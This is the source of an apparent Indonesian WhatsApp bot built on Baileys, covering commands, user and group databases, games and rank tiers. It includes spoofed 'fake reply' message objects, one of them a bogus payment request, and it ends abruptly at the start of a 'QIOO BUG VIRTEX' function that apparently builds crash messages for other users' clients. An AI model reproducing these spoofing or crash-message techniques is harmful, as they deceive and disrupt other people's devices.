/*

DILARANG MENYEBARKAN SC, HARGAI UANG LU DAN CREATOR

*/

const {
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	downloadContentFromMessage,
	areJidsSameUser,
	getContentType,
	delay,
	getDevice
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const fetch = require('node-fetch')
const translate = require("@vitalets/google-translate-api");
const util = require('util')
const chalk = require('chalk')
const {
	exec,
	spawn,
	execSync
} = require("child_process")
const axios = require('axios')
const cheerio = require('cheerio')
const cookie = require('cookie')
const path = require('path')
const os = require('os')
const toMS = require("ms");
const dns = require("dns")
const ms = require("parse-ms");
const nou = require("node-os-utils");
const gtts = require('node-gtts')
const crypto = require('crypto')
const moment = require('moment-timezone')
const ytdl = require("@vreden/youtube_scraper")
const {
	JSDOM
} = require('jsdom')
const speed = require('performance-now')
const cron = require('node-cron')
const PhoneNumber = require('awesome-phonenumber')
const gsmarena = require('gsmarena-api');
const {
	performance
} = require('perf_hooks')
const {
	sizeFormatter
} = require("human-readable");
const similarity = require('similarity')
const didyoumean = require('didyoumean');
const ffmpeg = require('fluent-ffmpeg')
const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./qioo_clone')
const threshold = 0.72
let pj = '`'
var dbs = []
global.dbc = dbs

//▢━━━━━━━━━━━━━━「 SCRAPERR 」━━━━━━━━━━━━━━▢
const _prem = require("./lib/premium");
const _mingguan = require("./lib/mingguan");
const _bulanan = require("./lib/bulanan");
const _sewa = require("./lib/sewa");
const {
	GameSession,
	SnakeAndLadderGame
} = require("./lib/ular-tangga")
const {
	casinoSave,
	setCasino,
	deleteCasino
} = require("./lib/casino");
const spamdetek = require("./lib/antispam");
const {
	generateProfilePicture,
	removeEmojis,
	smsg,
	tanggal,
	format,
	formatDate,
	getTime,
	isUrl,
	sleep,
	clockString,
	runtime,
	bytesToSize,
	fetchJson,
	getBuffer,
	jsonformat,
	parseMention,
	getRandom,
	getGroupAdmins
} = require('./lib/myfunc')
const {
	pomfCDN,
	TelegraPh,
	webp2mp4File,
	UploadFileUgu
} = require('./lib/uploader')
const {
	gempa,
	jadwalsholat,
	pinterest,
	wallpaper,
	wikimedia,
	quotesAnime,
	happymod,
	android1,
	cariresep,
	webtoons,
	trendtwit,
	mangatoon,
	mediafire,
	artinama,
	wattpad,
	kiryu,
	corona
} = require('./lib/scraper')
const {
	tiktokdl
} = require('tiktokdl')
const {
	remini
} = require('./lib/remini')
const {
	ngazap
} = require('./lib/ngazap')
const {
	ffstalk
} = require('./lib/ffstalk')
const {
	mlstalk
} = require('./lib/mlstalk')
const {
	getCountryFromPhoneNumber
} = require("./lib/country")
const {
	blackboxGPT,
	blackboxIMG,
	spotifydl,
	checkBandwidth,
	createPaste,
	pasteGG,
	Replicate,
	sdxlAnime,
	sdxlWaifu,
	sdxlEmoji,
	processing,
	remini2,
	diff,
	jarak,
	tiktokSearchVideo,
	clean,
	ssweb,
	ephoto,
	searchSpotifyTracks,
	QiooBotika,
	GPTwordle,
	txt2img,
	faceSwap,
	getJobs,
	transfrom,
	listSampler,
	listModels,
	getModels,
	luminaitext,
	luminaigambar,
	CarbonifyV1,
	CarbonifyV2,
	convertAngka,
	text2img,
	scsearch,
	capcutdl,
	igdown,
	twiterdl,
	snapsave,
	GDriveDl,
	snapsavev2,
	youtubedlv2,
	convertv2,
	jadwalSholat,
	findKodeDaerah,
	downloadCapcut,
	searchTemplates,
	detailTemplates,
	GoogleImage,
	mediafireDl,
	stickerSearch,
	upscale,
	upscalev2,
	cococlip,
	uploadFileToGitHub
} = require('./lib/vreden-core')
const {
	ytmp3,
	ytmp4
} = require('./lib/ytdl')
const {
	color,
	bgcolor
} = require('./lib/color')
const afk = require("./lib/afk");


//▢━━━━━━━━━━━━━━「 DATA BASE  」━━━━━━━━━━━━━━▢
let setiker = JSON.parse(fs.readFileSync('./database/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/video.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let banned = JSON.parse(fs.readFileSync('./database/banned.json'))
let mess = JSON.parse(fs.readFileSync('./mess.json'));
let blacklist = JSON.parse(fs.readFileSync('./database/blacklist.json'));
let whitelist = JSON.parse(fs.readFileSync('./database/whitelist.json'));
let toxicc = JSON.parse(fs.readFileSync('./database/toxicc.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let setting = JSON.parse(fs.readFileSync('./config.json'));

const enter = '\n'

//▢━━━━━━━━━━━━━━「 GAME DATABASE 」━━━━━━━━━━━━━━▢
let tictactoe = [];
let kuis = []
const _family100 = {}
const tebakgambar = {}
const tebakgame = {}
const tebakhero = {}
const tebakff = {}
const tebakkabupaten = {}
const tebakjkt48 = {}
const tebakhewan = {}
const tebakml = {}
const tebakchara = {}
const tebaklogo = {}
const tebakaplikasi = {}
const tebakkata = {}
const asahotak = {}
const lengkapikalimat = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const kuisioner = {}
const tebakkimia = {}
const tebaklirik = {}
const tebaktebakan = {}
const petakbom = {}
const pirates = {}
const mathgame = {}
const verifyNumber = {}

//▢━━━━━━━━━━━━━━「 MODULE EXPORTS 」━━━━━━━━━━━━━━▢
moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = vreden = async (vreden, m, chatUpdate, mek, store) => {
	try {
		const {
			notifRegister,
			onlyRegister,
			menu,
			home,
			ownerNumber,
			tiktok,
			instagram,
			gcwa,
			ownerName,
			botName,
			footer,
			location,
			eggsnya,
			netsnya,
			apiuser,
			cred,
			panel,
			pathimg,
			idsaluran,
			namasaluran,
			gamewaktu,
			toxicCount,
			Antilink2Count,
			limitCount,
			nomorOwner
		} = setting
		var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : (m.mtype === "viewOnceMessageV2") ? (m.msg.message.imageMessage?.caption || m.msg.message.videoMessage?.caption || "") : "";
		var budy = (typeof m.text == 'string' ? m.text : '')
		const content = JSON.stringify(mek.message)
		const type = Object.keys(mek.message)[0];
		if (m && type == "protocolMessage") vreden.ev.emit("message.delete", m.message.protocolMessage.key);
		const botNumber = await vreden.decodeJid(vreden.user.id)
		const isCreator = [nomorOwner, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) ? true : m.isChecking ? true : false
		const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
		const isCmd = body.startsWith(prefix)
		const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
		const isCommand2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const command = setting.prefix ? isCommand : isCommand2
		const args = body.trim().split(/ +/).slice(1)
		const pushname = m.pushName || "No Name"
		const itsMe = m.sender == botNumber ? true : false
		const text = q = args.join(" ")
		const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
		const isMedia = /image|video|sticker|audio/.test(mime)
		let footxt = `${footer}`
		const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
		const jam = moment().format("HH:mm z")
		const time2 = moment().tz('Asia/Jakarta').format("HH:mm:ss")
		const date = moment.tz('Asia/Jakarta').format(`DD MMM yyyy`)
		if (time2 < "23:59:00") {
			var ucapanWaktu = `[ ${jam} ] Malam 🌌`
		}
		if (time2 < "19:00:00") {
			var ucapanWaktu = `[ ${jam} ] Sore 🌃`
		}
		if (time2 < "18:00:00") {
			var ucapanWaktu = `[ ${jam} ] Sore 🌅`
		}
		if (time2 < "15:00:00") {
			var ucapanWaktu = `[ ${jam} ] Siang 🏙`
		}
		if (time2 < "11:00:00") {
			var ucapanWaktu = `[ ${jam} ] Pagi 🌄`
		}
		if (time2 < "05:00:00") {
			var ucapanWaktu = `[ ${jam} ] Pagi 🌉`
		}

		//▢━━━━━━━━━━━━━━「 GROUP FUNGSI  」━━━━━━━━━━━━━━▢
		const groupMetadata = m.isGroup ? await vreden.groupMetadata(m.chat).catch(e => null) : null;
        const groupName = m.isGroup ? groupMetadata?.subject : '';
        const groupMembers = m.isGroup ? groupMetadata?.participants : [];
        const participants = m.isGroup ? groupMetadata?.participants : [];
        const groupAdmins = m.isGroup ? getGroupAdmins(participants) : [];
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
        const isBan = banned.includes(m.sender);
        const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender);
        const isMingguan = _mingguan.checkMingguanUser(m.sender);
        const isBulanan = _bulanan.checkBulananUser(m.sender);
        const isSewa = _sewa.checkSewaGroup(m.chat);
        const isBlacklist = blacklist.includes(m.sender);
        const isWhitelist = whitelist.includes(m.sender);
		const isAfkOn = afk.checkAfkUser(m.sender, _afk)
		const gcounti = setting.gcount
		const gcount = isPremium ? gcounti.prem : gcounti.user
		let timestamp = speed();
		let latensi = speed() - timestamp
		dbs.push({
			id: m.key.id,
			m
		});

		//━━━━━━━━━━━━━━━[ FUNCIONT]━━━━━━━━━━━━━━━━━//
		const ments = (text) => {
			return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
		}
		const nomore = m.sender.replace(/[^0-9]/g, '')

		const reply = (teks) => {
			return vreden.sendMessage(m.chat, {
				text: teks,
				mentions: ments(teks)
			}, {
				quoted: m
			})
		}

		const nebal = (angka) => {
			return Math.floor(angka)
		}

		function capitalizeWords(str) {
			return str
				.split(' ') // Memisahkan string menjadi array kata-kata
				.map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()) // Mengubah huruf pertama setiap kata menjadi kapital
				.join(' '); // Menggabungkan kembali array kata-kata menjadi string
		}

		function hitungmundur(tanggal, bulan, tahun) {
			let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
			let now = Date.now();
			let distance = from - now;
			let days = Math.floor(distance / (1000 * 60 * 60 * 24));
			let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
			let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
			let seconds = Math.floor((distance % (1000 * 60)) / 1000);
			return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit '
		}

		const isEmoji = (emo) => {
			let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
			let regexEmoji = new RegExp(emoji_ranges, 'gi');
			return emo.match(regexEmoji)
		}

		async function pickRandom(list) {
			return list[Math.floor(Math.random() * list.length)]
		}

		async function dellCase(filePath, caseNameToRemove) {
			fs.readFile(filePath, 'utf8', (err, data) => {
				if (err) {
					console.error('Terjadi kesalahan:', err);
					return;
				}

				const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
				const modifiedData = data.replace(regex, '');

				fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
					if (err) {
						console.error('Terjadi kesalahan saat menulis file:', err);
						return;
					}

					console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
				});
			});
		}


		async function getGcName(groupID) {
			try {
				let data_name = await vreden.groupMetadata(groupID)
				return data_name.subject
			} catch (err) {
				return '-'
			}
		}

		function randomNomor(min, max = null) {
			if (max !== null) {
				min = Math.ceil(min);
				max = Math.floor(max);
				return Math.floor(Math.random() * (max - min + 1)) + min;
			} else {
				return Math.floor(Math.random() * min) + 1
			}
		}

		//━━━━━━━━━━━━━━━[ DATABASE USER ]━━━━━━━━━━━━━━━━━//
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let limitUser = isPremium ? 10000000 : limitCount
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!('rpg' in user)) user.rpg = false
				if (!('daftar' in user)) user.daftar = false
				if (!('qioo' in user)) user.qioo = false
				if (!('chatAi' in user)) user.chatAi = false
				if (!('caiSesi' in user)) user.caiSesi = ''
				if (!('pctime' in user)) user.pctime = ''
				if (!('nama' in user)) user.nama = 'Guest'
				if (!('pacar' in user)) user.pacar = ""
				if (!('askot' in user)) user.askot = "jakarta"
				if (!isNumber(user.umur)) user.umur = 0
				if (!isNumber(user.glimit)) user.glimit = gcount
				if (!isNumber(user.limit)) user.limit = limitUser
				if (!isNumber(user.saldo)) user.saldo = 0
				if (!isNumber(user.exp)) user.exp = 0
				if (!isNumber(user.rank)) user.rank = 700
				if (!isNumber(user.antilinkcount)) user.antilinkcount = 0
				if (!isNumber(user.toxiccount)) user.toxiccount = 0
				if (!isNumber(user.level)) user.level = 0
			} else global.db.data.users[m.sender] = {
				rpg: false,
				daftar: false,
				qioo: false,
				chatAi: false,
				caiSesi: '',
				pctime: '',
				nama: 'Guest',
				pacar: "",
				askot: "jakarta",
				umur: 0,
				glimit: gcount,
				limit: limitUser,
				saldo: 0,
				exp: 0,
				rank: 700,
				antilinkcount: 0,
				toxiccount: 0,
				level: 0
			}
		} catch (e) {
			console.log(e)
		}
		//━━━━━━━━━━━━━━━[ DATABASE CHAT ]━━━━━━━━━━━━━━━━━//
		try {
			let chats = global.db.data.chats[m.chat]
			if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
			if (chats) {
				if (!('goodbye' in chats)) chats.goodbye = setting.auto_leaveMsg
				if (!('welcome' in chats)) chats.welcome = setting.auto_welcomeMsg
				if (!('antilink' in chats)) chats.antilink = false
				if (!('antibot' in chats)) chats.antibot = false
				if (!('antibot2' in chats)) chats.antibot2 = false
				if (!('antilinktt' in chats)) chats.antilinktt = false
				if (!('antiaudio' in chats)) chats.antiaudio = false
				if (!('antisticker' in chats)) chats.antisticker = false
				if (!('antiimage' in chats)) chats.antiimage = false
				if (!('antivideo' in chats)) chats.antivideo = false
				if (!('antidocument' in chats)) chats.antidocument = false
				if (!('antitoxic' in chats)) chats.antitoxic = false
				if (!('antivirtex' in chats)) chats.antivirtex = false
				if (!('antipromosi' in chats)) chats.antipromosi = false
				if (!('antiwame' in chats)) chats.antiwame = false
				if (!('antiwame2' in chats)) chats.antiwame2 = false
				if (!('antipolling' in chats)) chats.antipolling = false
				if (!('antilinkall' in chats)) chats.antilinkall = false
				if (!('antilink2' in chats)) chats.antilink2 = false
				if (!('autodl' in chats)) chats.autodl = false
				if (!('autoaigc' in chats)) chats.autoaigc = false
				if (!('autoaipc' in chats)) chats.autoaipc = false
				if (!('kickme' in chats)) chats.kickme = false
				if (!('keamanan' in chats)) chats.keamanan = false
				if (!('mute' in chats)) chats.mute = false
				if (!('setproses' in chats)) chats.setproses = false
				if (!('setdone' in chats)) chats.setdone = false
				if (!('setclose' in chats)) chats.setclose = false
				if (!('setopen' in chats)) chats.setopen = false
				if (!('setleft' in chats)) chats.setleft = false
				if (!('setwelcome' in chats)) chats.setwelcome = false
				if (!('liststore' in chats)) chats.liststore = {}
				if (!('nsfw' in chats)) chats.nsfw = false
			} else global.db.data.chats[m.chat] = {
				goodbye: setting.auto_leaveMsg,
				welcome: setting.auto_welcomeMsg,
				antilink: false,
				antibot: false,
				antibot2: false,
				antilinktt: false,
				antiaudio: false,
				antisticker: false,
				antiimage: false,
				antivideo: false,
				antidocument: false,
				antitoxic: false,
				antivirtex: false,
				antipromosi: false,
				antiwame: false,
				antiwame2: false,
				antipolling: false,
				antilinkall: false,
				antilink2: false,
				autodl: false,
				autoaigc: false,
				autoaipc: false,
				kickme: false,
				keamanan: false,
				mute: false,
				setproses: false,
				setdone: false,
				setclose: false,
				setopen: false,
				setleft: false,
				setwelcome: false,
				liststore: {},
				nsfw: false
			}
		} catch (e) {
			console.log(e)
		}
		//━━━━━━━━━━━━━━━[ DATABASE RPG ]━━━━━━━━━━━━━━━━━//
		try {
			let rpgdata = global.db.data.rpg
			if (typeof rpgdata !== 'object') global.db.data.rpg = {}
			let rpg = rpgdata[m.sender]
			if (typeof rpg !== 'object') global.db.data.rpg[m.sender] = {}
			if (rpg) {
				if (!('kapal' in rpg)) rpg.kapal = false
				if (!('darahkapal' in rpg)) rpg.darahkapal = 100
				if (!('pickaxe' in rpg)) rpg.pickaxe = false
				if (!('darahpickaxe' in rpg)) rpg.darahpickaxe = 100
				if (!('kapak' in rpg)) rpg.kapak = false
				if (!('darahkapak' in rpg)) rpg.darahkapak = 100
				if (!('bzirah' in rpg)) rpg.bzirah = false
				if (!('darahbzirah' in rpg)) rpg.darahbzirah = 100
				if (!('pedang' in rpg)) rpg.pedang = false
				if (!('darahpedang' in rpg)) rpg.darahpedang = 100
				if (!('darahuser' in rpg)) rpg.darahuser = 100
				if (!('rumah' in rpg)) rpg.rumah = 0
				if (!('besi' in rpg)) rpg.besi = 4
				if (!('kayu' in rpg)) rpg.kayu = 2
				if (!('emas' in rpg)) rpg.emas = 0
				if (!('perak' in rpg)) rpg.perak = 0
				if (!('batubara' in rpg)) rpg.batubara = 0
				if (!('bulu' in rpg)) rpg.bulu = 0
				if (!('kain' in rpg)) rpg.kain = 0
				if (!('wilayah' in rpg)) rpg.wilayah = "indonesia"
				if (!('wilayahrumah' in rpg)) rpg.wilayahrumah = "indonesia"
				if (!('musuh' in rpg)) rpg.musuh = 0
				if (!('ikan' in rpg)) rpg.ikan = 0
				if (!('domba' in rpg)) rpg.domba = 0
				if (!('sapi' in rpg)) rpg.sapi = 0
				if (!('ayam' in rpg)) rpg.ayam = 0
				if (!('burutime' in rpg)) rpg.burutime = 0
				if (!('lastkerja' in rpg)) rpg.lastkerja = 0
				if (!('lastrampok' in rpg)) rpg.lastrampok = 0
			} else global.db.data.rpg[m.sender] = {
				kapal: false,
				darahkapal: 100,
				pickaxe: false,
				darahpickaxe: 100,
				kapak: false,
				darahkapak: 100,
				bzirah: false,
				darahbzirah: 100,
				pedang: false,
				darahpedang: 100,
				darahuser: 100,
				rumah: 0,
				besi: 4,
				kayu: 2,
				emas: 0,
				perak: 0,
				batubara: 0,
				bulu: 0,
				kain: 0,
				wilayah: "indonesia",
				wilayahrumah: "indonesia",
				musuh: 0,
				ikan: 0,
				domba: 0,
				sapi: 0,
				ayam: 0,
				burutime: 0,
				lastkerja: 0,
				lastrampok: 0
			}
		} catch (e) {
			console.log(e)
		}

		let usersdb = global.db.data.users
		let chatsdb = global.db.data.chats
		let rpgdb = global.db.data.rpg

		fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))

		//━━━━━━━━━━━━━━━[ FAKE REPLY ]━━━━━━━━━━━━━━━━━//
		let usernomor = await PhoneNumber('+' + m.sender.replace('@s.whatsapp.net', '')).getNumber('international')
		let ownnomor = await PhoneNumber('+' + nomorOwner.replace('@s.whatsapp.net', '')).getNumber('international')
		const fkonk1 = {
			key: {
				participant: `${m.sender}`,
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				conversation: `👤 *${usersdb[m.sender].nama}*\n🔢 *${usernomor}*`
			}
		}
		const fkonk2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				'contactMessage': {
					'displayName': `${usersdb[m.sender].nama}👤`,
					'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${usersdb[m.sender].nama},;;;\nFN:${usersdb[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					'jpegThumbnail': pathimg,
					thumbnail: pathimg,
					sendEphemeral: true
				}
			}
		}
		const fkonk3 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				'contactMessage': {
					'displayName': `${usersdb[m.sender].nama}`,
					'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${usersdb[m.sender].nama},;;;\nFN:${usersdb[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					'jpegThumbnail': pathimg,
					thumbnail: pathimg,
					sendEphemeral: true
				}
			}
		}
		const fbot = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				'contactMessage': {
					'displayName': `${botName}`,
					'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${usersdb[m.sender].nama},;;;\nFN:${usersdb[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
					'jpegThumbnail': pathimg,
					thumbnail: pathimg,
					sendEphemeral: true
				}
			}
		}
		const repPy = {
			key: {
				remoteJid: '0@s.whatsapp.net',
				fromMe: false,
				id: `628555`,
				participant: '0@s.whatsapp.net'
			},
			message: {
				requestPaymentMessage: {
					currencyCodeIso4217: "USD",
					amount1000: 999999999,
					requestFrom: '0@s.whatsapp.net',
					noteMessage: {
						extendedTextMessage: {
							text: `*${botName}*\n👤 *${usersdb[m.sender].nama}*\n🔢 *${usernomor}*`
						}
					},
					expiryTimestamp: 999999999,
					amount: {
						value: 91929291929,
						offset: 1000,
						currencyCode: "INR"
					}
				}
			}
		}
		let fconver = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "0@s.whatsapp.net"
				} : {})
			},
			message: {
				conversation: `👤 *${usersdb[m.sender].nama}*\n🔢 *${usernomor}*`
			}
		};
		let fhalo = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "0@s.whatsapp.net"
				} : {})
			},
			message: {
				conversation: `Hallo User👋`
			}
		};
		let fchannel = {
			key: {
				fromMe: false,
				participant: m.sender,
				...(m.chat ? {
					remoteJid: m.sender
				} : {})
			},
			message: {
				newsletterAdminInviteMessage: {
					newsletterJid: idsaluran,
					newsletterName: namasaluran,
					caption: prefix + command
				}
			}
		};

		//━━━━━━━━━━━━━━━[ PUBLIC OR SELF ]━━━━━━━━━━━━━━━━━//
		if (!vreden.public) {
			if (!isCreator) return
		}

		//▢━━━━━━━━━━━━━━「 BALANCE ROLE 」━━━━━━━━━━━━━━▢
		if (usersdb[m.sender].exp > 2500) {
			try {
				avatar = await vreden.profilePictureUrl(m.sender, "image")
			} catch {
				avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
			}
			usersdb[m.sender].exp = 0
			usersdb[m.sender].level += 1
			await sleep(1000)
			let button = [{
				"name": "cta_url",
				"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}&text=Halo👋\"}`
			}]
			vreden.sendButtonImage(m.chat, {
				url: `https://api.vreden.my.id/api/levelup?background=https://pomf2.lain.la/f/6mtxnwrm.jpg&name=${encodeURIComponent(usernomor)}&level=${usersdb[m.sender].level - 1}&levelup=${usersdb[m.sender].level}&avatar=${encodeURIComponent(avatar)}`
			}, button, `*🎉 C O N G R A T S 🎉*\n\n*${usersdb[m.sender].level - 1}* *➔* *${usersdb[m.sender].level}*\n\n• 🧬Level Sebelumnya : ${usersdb[m.sender].level - 1}\n• 🧬Level Baru : ${usersdb[m.sender].level}\n• Pada Jam : ${new Date().toLocaleString("id-ID")}\n\n\n*Note:*\n_Semakin sering berinteraksi_\n_dengan bot semakin_\n_tinggi level kamu_`, footer, m)
		}

		if (usersdb[m.sender].rank < 1) {
			usersdb[m.sender].rank = 0
		}

		function pangkat(idrole) {
			var levelRole = usersdb[idrole].rank
			var role = {
				rank: 'Bronze I',
				name: 'Bronze',
				id: 1
			}
			if (levelRole <= 1000) {
				role = {
					rank: 'Bronze I',
					name: 'Bronze',
					id: 1
				}
			} else if (levelRole <= 1100) {
				role = {
					rank: 'Bronze II',
					name: 'Bronze',
					id: 2
				}
			} else if (levelRole <= 1200) {
				role = {
					rank: 'Bronze III',
					name: 'Bronze',
					id: 3
				}
			} else if (levelRole <= 1300) {
				role = {
					rank: 'Silver I',
					name: 'Silver',
					id: 1
				}
			} else if (levelRole <= 1400) {
				role = {
					rank: 'Silver II',
					name: 'Silver',
					id: 2
				}
			} else if (levelRole <= 1500) {
				role = {
					rank: 'Silver III',
					name: 'Silver',
					id: 3
				}
			} else if (levelRole <= 1600) {
				role = {
					rank: 'Gold I',
					name: 'Gold',
					id: 1
				}
			} else if (levelRole <= 1725) {
				role = {
					rank: 'Gold II',
					name: 'Gold',
					id: 2
				}
			} else if (levelRole <= 1850) {
				role = {
					rank: 'Gold III',
					name: 'Gold',
					id: 3
				}
			} else if (levelRole <= 1975) {
				role = {
					rank: 'Gold IV',
					name: 'Gold',
					id: 4
				}
			} else if (levelRole <= 2100) {
				role = {
					rank: 'Platinum I',
					name: 'Platinum',
					id: 1
				}
			} else if (levelRole <= 2225) {
				role = {
					rank: 'Platinum II',
					name: 'Platinum',
					id: 2
				}
			} else if (levelRole <= 2350) {
				role = {
					rank: 'Platinum III',
					name: 'Platinum',
					id: 3
				}
			} else if (levelRole <= 2475) {
				role = {
					rank: 'Platinum IV',
					name: 'Platinum',
					id: 4
				}
			} else if (levelRole <= 2600) {
				role = {
					rank: 'Diamond I',
					name: 'Diamond',
					id: 1
				}
			} else if (levelRole <= 2750) {
				role = {
					rank: 'Diamond II',
					name: 'Diamond',
					id: 2
				}
			} else if (levelRole <= 2900) {
				role = {
					rank: 'Diamond III',
					name: 'Diamond',
					id: 3
				}
			} else if (levelRole <= 3050) {
				role = {
					rank: 'Diamond IV',
					name: 'Diamond',
					id: 4
				}
			} else if (levelRole <= 3200) {
				role = {
					rank: 'Heroic',
					name: 'Heroic',
					id: 0
				}
			} else if (levelRole <= 3500) {
				role = {
					rank: 'Heroic ✩',
					name: 'Heroic',
					id: 1
				}
			} else if (levelRole <= 4000) {
				role = {
					rank: 'Heroic ✩✩',
					name: 'Heroic',
					id: 2
				}
			} else if (levelRole <= 4350) {
				role = {
					rank: 'Heroic ✩✩✩',
					name: 'Heroic',
					id: 3
				}
			} else if (levelRole <= 5050) {
				role = {
					rank: 'Master ✯',
					name: 'Master',
					id: 1
				}
			} else if (levelRole <= 5400) {
				role = {
					rank: 'Master ✯✯',
					name: 'Master',
					id: 2
				}
			} else if (levelRole <= 6500) {
				role = {
					rank: 'Master ✯✯✯',
					name: 'Master',
					id: 3
				}
			} else if (levelRole <= 7150) {
				role = {
					rank: 'GrandMaster',
					name: 'GrandMaster',
					id: 0
				}
			} else if (levelRole <= 7700) {
				role = {
					rank: 'GrandMaster ✩',
					name: 'GrandMaster',
					id: 1
				}
			} else if (levelRole <= 9100) {
				role = {
					rank: 'GrandMaster ✩✩',
					name: 'GrandMaster',
					id: 2
				}
			} else if (levelRole <= 10800) {
				role = {
					rank: 'GrandMaster ✩✩✩',
					name: 'GrandMaster',
					id: 3
				}
			} else if (levelRole <= 99999999999999999999999999999) {
				role = {
					rank: 'GrandMaster ✩✩✩✩',
					name: 'GrandMaster',
					id: 4
				}
			}
			return role
		}
		//━━━━━━━━━━━━━━━[ QIOO BUG VIRTEX ]━━━━━━━━━━━━━━━━━//

		async function vredenbugone(chat) {
			var msg = generateWAMessageFromContent(chat, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'subtitle': " "
							},
							'body': {
